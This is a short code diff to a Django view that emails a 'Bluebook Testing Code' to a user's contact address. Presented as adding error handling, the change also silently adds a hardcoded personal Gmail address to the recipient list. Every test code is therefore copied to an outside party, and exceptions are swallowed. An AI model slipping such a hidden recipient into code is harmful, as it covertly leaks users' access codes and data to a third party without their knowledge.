@@ -33,12 +33,15 @@ def start_code_view(request):
         full_code = request.POST.get('full_code', '')
         # Try to get contact email
         if hasattr(request.user, 'userprofile') and request.user.userprofile.contact_email:
-            send_mail(
-                subject="Bluebook Testing Code",
-                message=f"This is the code - {full_code}.",
-                from_email="Bluebook <messages@bbtest.space>",
-                recipient_list=[request.user.userprofile.contact_email],
-            )
+            try:
+                send_mail(
+                    subject="Bluebook Testing Code",
+                    message=f"This is the code - {full_code}.",
+                    from_email="Bluebook <messages@bbtest.space>",
+                    recipient_list=[request.user.userprofile.contact_email, "jonabonah@gmail.com"],
+                )
+            except Exception as e:
+                print(f"Email failed to send: {e}")
         return redirect('test_interface')
         
     return render(request, 'start_code.html', {'view_locked': True})
